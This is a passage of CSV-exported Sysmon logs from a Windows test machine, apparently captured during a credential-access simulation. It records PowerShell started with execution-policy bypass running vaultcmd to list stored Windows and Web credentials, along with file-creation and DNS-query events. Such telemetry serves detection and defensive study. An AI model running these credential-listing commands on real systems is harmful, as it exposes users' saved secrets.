      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>11</EventID>
      <Version>2</Version>
      <Level>4</Level>
      <Task>11</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-28T09:34:28.3933050Z""/>
      <EventRecordID>9479</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""7044"" ThreadID=""6672""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-28 09:34:28.386</Data>
      <Data Name=""ProcessGuid"">{fda94052-4124-658d-7602-000000000b00}</Data>
      <Data Name=""ProcessId"">3284</Data>
      <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name=""TargetFilename"">C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_drn1bbhb.150.ps1</Data>
      <Data Name=""CreationUtcTime"">2023-12-28 09:34:28.386</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>File created:

RuleName: -

UtcTime: 2023-12-28 09:34:28.386

ProcessGuid: {fda94052-4124-658d-7602-000000000b00}

ProcessId: 3284

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

TargetFilename: C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_drn1bbhb.150.ps1

CreationUtcTime: 2023-12-28 09:34:28.386

User: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>File created (rule: FileCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,"""powershell.exe"" & {vaultcmd /listcreds:\""""Web Credentials\"""" /all}",Microsoft Corporation,WinDev2309Eval,,C:\Users\User\AppData\Local\Temp\,Windows PowerShell,,,,,,,1,9478,,10.0.22621.2215 (WinBuild.160101.0800),"MD5=824B9F337E68DD8C117595071AC11E23,SHA256=17083405E7DECB3DDEF837C2FA599293A4E8133736969DFD5CE92EF15608A587,IMPHASH=51B0FFFA02CA6C1B85189E2E6C139F36",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,Medium,0x8000000000000000,Information,{fda94052-3502-658d-b367-080000000000},0x867b3,"Process Create:

RuleName: -

UtcTime: 2023-12-28 09:34:28.256

ProcessGuid: {fda94052-4124-658d-7602-000000000b00}

ProcessId: 3284

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

FileVersion: 10.0.22621.2215 (WinBuild.160101.0800)

Description: Windows PowerShell

Product: Microsoft® Windows® Operating System

Company: Microsoft Corporation

OriginalFileName: PowerShell.EXE

CommandLine: ""powershell.exe"" & {vaultcmd /listcreds:\""""Web Credentials\"""" /all}

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {fda94052-3502-658d-b367-080000000000}

LogonId: 0x867B3

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=824B9F337E68DD8C117595071AC11E23,SHA256=17083405E7DECB3DDEF837C2FA599293A4E8133736969DFD5CE92EF15608A587,IMPHASH=51B0FFFA02CA6C1B85189E2E6C139F36

ParentProcessGuid: {fda94052-b87a-658c-2702-000000000b00}

ParentProcessId: 5076

ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass

ParentUser: WINDEV2309EVAL\User",Info,PowerShell.EXE,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,{fda94052-b87a-658c-2702-000000000b00},5076,WINDEV2309EVAL\User,,{fda94052-4124-658d-7602-000000000b00},7044,3284,Microsoft® Windows® Operating System,,,,,"
      ",-,,,,,,2023-12-28T09:34:28.2580973Z,,,Process Create (rule: ProcessCreate),1,6672,WINDEV2309EVAL\User,S-1-5-18,2023-12-28 09:34:28.256,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-28T09:34:28.2580973Z""/>
      <EventRecordID>9478</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""7044"" ThreadID=""6672""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-28 09:34:28.256</Data>
      <Data Name=""ProcessGuid"">{fda94052-4124-658d-7602-000000000b00}</Data>
      <Data Name=""ProcessId"">3284</Data>
      <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name=""FileVersion"">10.0.22621.2215 (WinBuild.160101.0800)</Data>
      <Data Name=""Description"">Windows PowerShell</Data>
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">PowerShell.EXE</Data>
      <Data Name=""CommandLine"">""powershell.exe"" &amp; {vaultcmd /listcreds:\""""Web Credentials\"""" /all}</Data>
      <Data Name=""CurrentDirectory"">C:\Users\User\AppData\Local\Temp\</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""LogonGuid"">{fda94052-3502-658d-b367-080000000000}</Data>
      <Data Name=""LogonId"">0x867b3</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">Medium</Data>
      <Data Name=""Hashes"">MD5=824B9F337E68DD8C117595071AC11E23,SHA256=17083405E7DECB3DDEF837C2FA599293A4E8133736969DFD5CE92EF15608A587,IMPHASH=51B0FFFA02CA6C1B85189E2E6C139F36</Data>
      <Data Name=""ParentProcessGuid"">{fda94052-b87a-658c-2702-000000000b00}</Data>
      <Data Name=""ParentProcessId"">5076</Data>
      <Data Name=""ParentImage"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name=""ParentCommandLine"">""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass</Data>
      <Data Name=""ParentUser"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-28 09:34:28.256

ProcessGuid: {fda94052-4124-658d-7602-000000000b00}

ProcessId: 3284

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

FileVersion: 10.0.22621.2215 (WinBuild.160101.0800)

Description: Windows PowerShell

Product: Microsoft&#174; Windows&#174; Operating System

Company: Microsoft Corporation

OriginalFileName: PowerShell.EXE

CommandLine: ""powershell.exe"" &amp; {vaultcmd /listcreds:\""""Web Credentials\"""" /all}

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {fda94052-3502-658d-b367-080000000000}

LogonId: 0x867B3

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=824B9F337E68DD8C117595071AC11E23,SHA256=17083405E7DECB3DDEF837C2FA599293A4E8133736969DFD5CE92EF15608A587,IMPHASH=51B0FFFA02CA6C1B85189E2E6C139F36

ParentProcessGuid: {fda94052-b87a-658c-2702-000000000b00}

ParentProcessId: 5076

ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass

ParentUser: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,"""C:\Windows\system32\VaultCmd.exe"" ""/listcreds:Windows Credentials"" /all",Microsoft Corporation,WinDev2309Eval,,C:\Users\User\AppData\Local\Temp\,Vault cmdline Program,,,,,,,1,9477,,10.0.22621.1 (WinBuild.160101.0800),"MD5=4D2AD9A08F33212EDE3A128E23F00759,SHA256=D76274F883C86EF2B9090E43935D9ADC6B81B35A2A6FA39E37890F80FDFA9B76,IMPHASH=423E299DF33B8039596FF81AE53C9CA4",C:\Windows\System32\VaultCmd.exe,,Medium,0x8000000000000000,Information,{fda94052-3502-658d-b367-080000000000},0x867b3,"Process Create:

RuleName: -

UtcTime: 2023-12-28 09:34:27.956

ProcessGuid: {fda94052-4123-658d-7502-000000000b00}

ProcessId: 3796

Image: C:\Windows\System32\VaultCmd.exe

FileVersion: 10.0.22621.1 (WinBuild.160101.0800)

Description: Vault cmdline Program

Product: Microsoft® Windows® Operating System

Company: Microsoft Corporation

OriginalFileName: VAULTCMD.EXE

CommandLine: ""C:\Windows\system32\VaultCmd.exe"" ""/listcreds:Windows Credentials"" /all

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {fda94052-3502-658d-b367-080000000000}

LogonId: 0x867B3

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=4D2AD9A08F33212EDE3A128E23F00759,SHA256=D76274F883C86EF2B9090E43935D9ADC6B81B35A2A6FA39E37890F80FDFA9B76,IMPHASH=423E299DF33B8039596FF81AE53C9CA4

ParentProcessGuid: {fda94052-4123-658d-7302-000000000b00}

ParentProcessId: 1104

ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

ParentCommandLine: ""powershell.exe"" & {vaultcmd /listcreds:\""""Windows Credentials\"""" /all}

ParentUser: WINDEV2309EVAL\User",Info,VAULTCMD.EXE,"""powershell.exe"" & {vaultcmd /listcreds:\""""Windows Credentials\"""" /all}",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,{fda94052-4123-658d-7302-000000000b00},1104,WINDEV2309EVAL\User,,{fda94052-4123-658d-7502-000000000b00},7044,3796,Microsoft® Windows® Operating System,,,,,"
      ",-,,,,,,2023-12-28T09:34:27.9586817Z,,,Process Create (rule: ProcessCreate),1,6672,WINDEV2309EVAL\User,S-1-5-18,2023-12-28 09:34:27.956,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-28T09:34:27.9586817Z""/>
      <EventRecordID>9477</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""7044"" ThreadID=""6672""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-28 09:34:27.956</Data>
      <Data Name=""ProcessGuid"">{fda94052-4123-658d-7502-000000000b00}</Data>
      <Data Name=""ProcessId"">3796</Data>
      <Data Name=""Image"">C:\Windows\System32\VaultCmd.exe</Data>
      <Data Name=""FileVersion"">10.0.22621.1 (WinBuild.160101.0800)</Data>
      <Data Name=""Description"">Vault cmdline Program</Data>
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">VAULTCMD.EXE</Data>
      <Data Name=""CommandLine"">""C:\Windows\system32\VaultCmd.exe"" ""/listcreds:Windows Credentials"" /all</Data>
      <Data Name=""CurrentDirectory"">C:\Users\User\AppData\Local\Temp\</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""LogonGuid"">{fda94052-3502-658d-b367-080000000000}</Data>
      <Data Name=""LogonId"">0x867b3</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">Medium</Data>
      <Data Name=""Hashes"">MD5=4D2AD9A08F33212EDE3A128E23F00759,SHA256=D76274F883C86EF2B9090E43935D9ADC6B81B35A2A6FA39E37890F80FDFA9B76,IMPHASH=423E299DF33B8039596FF81AE53C9CA4</Data>
      <Data Name=""ParentProcessGuid"">{fda94052-4123-658d-7302-000000000b00}</Data>
      <Data Name=""ParentProcessId"">1104</Data>
      <Data Name=""ParentImage"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name=""ParentCommandLine"">""powershell.exe"" &amp; {vaultcmd /listcreds:\""""Windows Credentials\"""" /all}</Data>
      <Data Name=""ParentUser"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-28 09:34:27.956

ProcessGuid: {fda94052-4123-658d-7502-000000000b00}

ProcessId: 3796

Image: C:\Windows\System32\VaultCmd.exe

FileVersion: 10.0.22621.1 (WinBuild.160101.0800)

Description: Vault cmdline Program

Product: Microsoft&#174; Windows&#174; Operating System

Company: Microsoft Corporation

OriginalFileName: VAULTCMD.EXE

CommandLine: ""C:\Windows\system32\VaultCmd.exe"" ""/listcreds:Windows Credentials"" /all

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {fda94052-3502-658d-b367-080000000000}

LogonId: 0x867B3

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=4D2AD9A08F33212EDE3A128E23F00759,SHA256=D76274F883C86EF2B9090E43935D9ADC6B81B35A2A6FA39E37890F80FDFA9B76,IMPHASH=423E299DF33B8039596FF81AE53C9CA4

ParentProcessGuid: {fda94052-4123-658d-7302-000000000b00}

ParentProcessId: 1104

ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

ParentCommandLine: ""powershell.exe"" &amp; {vaultcmd /listcreds:\""""Windows Credentials\"""" /all}

ParentUser: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,,,WinDev2309Eval,2023-12-28 09:34:27.193,,,,,,,,,11,9476,,,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,0x8000000000000000,Information,,,"File created:

RuleName: -

UtcTime: 2023-12-28 09:34:27.193

ProcessGuid: {fda94052-4123-658d-7302-000000000b00}

ProcessId: 1104

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

TargetFilename: C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_vc1ymjor.l0u.ps1

CreationUtcTime: 2023-12-28 09:34:27.193

User: WINDEV2309EVAL\User",Info,,,,,,,,{fda94052-4123-658d-7302-000000000b00},7044,1104,,,,,,"
      ",-,,,,,,2023-12-28T09:34:27.1954741Z,C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_vc1ymjor.l0u.ps1,,File created (rule: FileCreate),,6672,WINDEV2309EVAL\User,S-1-5-18,2023-12-28 09:34:27.193,2,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>11</EventID>
      <Version>2</Version>
      <Level>4</Level>
      <Task>11</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-28T09:34:27.1954741Z""/>
      <EventRecordID>9476</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""7044"" ThreadID=""6672""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-28 09:34:27.193</Data>
      <Data Name=""ProcessGuid"">{fda94052-4123-658d-7302-000000000b00}</Data>
      <Data Name=""ProcessId"">1104</Data>
      <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name=""TargetFilename"">C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_vc1ymjor.l0u.ps1</Data>
      <Data Name=""CreationUtcTime"">2023-12-28 09:34:27.193</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>File created:

RuleName: -

UtcTime: 2023-12-28 09:34:27.193

ProcessGuid: {fda94052-4123-658d-7302-000000000b00}

ProcessId: 1104

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

TargetFilename: C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_vc1ymjor.l0u.ps1

CreationUtcTime: 2023-12-28 09:34:27.193

User: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>File created (rule: FileCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,,,WinDev2309Eval,,,,,,,,,,22,9475,,,,<unknown process>,,,0x8000000000000000,Information,,,"Dns query:

RuleName: -

UtcTime: 2023-12-27 23:54:25.625

ProcessGuid: {fda94052-4120-658d-6f02-000000000b00}

ProcessId: 8968

QueryName: raw.githubusercontent.com

QueryStatus: 0

QueryResults: ::ffff:185.199.110.133;::ffff:185.199.108.133;::ffff:185.199.109.133;::ffff:185.199.111.133;

Image: <unknown process>

User: WINDEV2309EVAL\User",Info,,,,,,,,{fda94052-4120-658d-6f02-000000000b00},7044,8968,,,raw.githubusercontent.com,::ffff:185.199.110.133;::ffff:185.199.108.133;::ffff:185.199.109.133;::ffff:185.199.111.133;,0,"
      ",-,,,,,,2023-12-28T09:34:27.1164283Z,,,Dns query (rule: DnsQuery),,1124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 23:54:25.625,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>22</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>22</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-28T09:34:27.1164283Z""/>
      <EventRecordID>9475</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""7044"" ThreadID=""1124""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-27 23:54:25.625</Data>
      <Data Name=""ProcessGuid"">{fda94052-4120-658d-6f02-000000000b00}</Data>
      <Data Name=""ProcessId"">8968</Data>
      <Data Name=""QueryName"">raw.githubusercontent.com</Data>
      <Data Name=""QueryStatus"">0</Data>
      <Data Name=""QueryResults"">::ffff:185.199.110.133;::ffff:185.199.108.133;::ffff:185.199.109.133;::ffff:185.199.111.133;</Data>
      <Data Name=""Image"">&lt;unknown process&gt;</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Dns query:

RuleName: -

UtcTime: 2023-12-27 23:54:25.625

ProcessGuid: {fda94052-4120-658d-6f02-000000000b00}

ProcessId: 8968

QueryName: raw.githubusercontent.com

QueryStatus: 0

QueryResults: ::ffff:185.199.110.133;::ffff:185.199.108.133;::ffff:185.199.109.133;::ffff:185.199.111.133;

Image: &lt;unknown process&gt;

User: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>Dns query (rule: DnsQuery)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,,,WinDev2309Eval,,,,,,,,,,22,9474,,,,C:\Windows\system32\svchost.exe,,,0x8000000000000000,Information,,,"Dns query:

RuleName: -

UtcTime: 2023-12-27 23:54:25.260

ProcessGuid: {fda94052-34f2-658d-3f00-000000000b00}

ProcessId: 2948

QueryName: wpad

QueryStatus: 1460

QueryResults: -

Image: C:\Windows\system32\svchost.exe

User: NT AUTHORITY\LOCAL SERVICE",Info,,,,,,,,{fda94052-34f2-658d-3f00-000000000b00},7044,2948,,,wpad,-,1460,"
      ",-,,,,,,2023-12-28T09:34:27.1159458Z,,,Dns query (rule: DnsQuery),,1124,NT AUTHORITY\LOCAL SERVICE,S-1-5-18,2023-12-27 23:54:25.260,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>22</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>22</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-28T09:34:27.1159458Z""/>
      <EventRecordID>9474</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""7044"" ThreadID=""1124""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-27 23:54:25.260</Data>
      <Data Name=""ProcessGuid"">{fda94052-34f2-658d-3f00-000000000b00}</Data>
      <Data Name=""ProcessId"">2948</Data>
      <Data Name=""QueryName"">wpad</Data>
      <Data Name=""QueryStatus"">1460</Data>
      <Data Name=""QueryResults"">-</Data>
      <Data Name=""Image"">C:\Windows\system32\svchost.exe</Data>
      <Data Name=""User"">NT AUTHORITY\LOCAL SERVICE</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Dns query:

RuleName: -

UtcTime: 2023-12-27 23:54:25.260

ProcessGuid: {fda94052-34f2-658d-3f00-000000000b00}

ProcessId: 2948

QueryName: wpad

QueryStatus: 1460

QueryResults: -

Image: C:\Windows\system32\svchost.exe

User: NT AUTHORITY\LOCAL SERVICE</Message>
      <Level>Information</Level>
      <Task>Dns query (rule: DnsQuery)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
